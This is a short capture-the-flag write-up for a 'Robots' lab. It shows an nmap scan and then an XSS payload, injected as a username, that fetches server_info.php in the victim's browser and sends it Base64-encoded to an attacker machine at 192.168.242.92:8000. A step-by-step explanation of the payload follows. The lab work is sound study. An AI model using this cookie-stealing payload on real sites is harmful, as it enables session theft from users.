# Robots v1.7

```bash
nmap 10.48.147.28 -sC -oN nmap.scan -T 4 --min-rate 4000 -sCV
```

```
22/tcp open ssh OpenSSH 8.9p1 (protocol 2.0)
80/tcp open http Apache httpd 2.4.61
| http-robots.txt: 3 disallowed entries
|\_/harming/humans /ignoring/human/orders /harm/to/self
|\_http-server-header: Apache/2.4.61 (Debian)
|\_http-title: 403 Forbidden
9000/tcp open http Apache httpd 2.4.52 ((Ubuntu))
|\_http-title: Apache2 Ubuntu Default Page: It works
|\_http-server-header: Apache/2.4.52 (Ubuntu)
Service Info: Host: robots.thm
```

When we visit to path mentioned in robots.txt. we get Forbidden. but /har/to/self is allowed. when we visit it, ther's a registration form. Loggin page reflects the username so it can be XSS vulnerability.

I tried `<BS><script>fetch.('/harm/to/self/server_info.php').then(response=>response.text()).then(data=>fetch('192.168.242.92:8000/?cookie='+btoa(data)));</script>` as username

Step-by-step execution in the victim’s browser:

<script> ... </script>

Executes JavaScript in the context of the vulnerable web page after an injection (e.g., XSS).

fetch('/harm/to/self/server_info.php')
Browser sends an HTTP request to the target web application endpoint server_info.php.
Because the script runs in the page’s origin, the request includes the victim’s session cookies automatically.

.then(response => response.text())
Converts the HTTP response body into plain text.

.then(data => ...)
Receives the text returned by server_info.php.

btoa(data)
Encodes the response into Base64.
Reason: ensures special characters do not break the URL.

fetch('http://192.168.242.92:8000/?cookie=' + btoa(data))
Sends another request to the attacker machine (192.168.242.92) on port 8000.
The Base64-encoded data is appended as a query parameter.
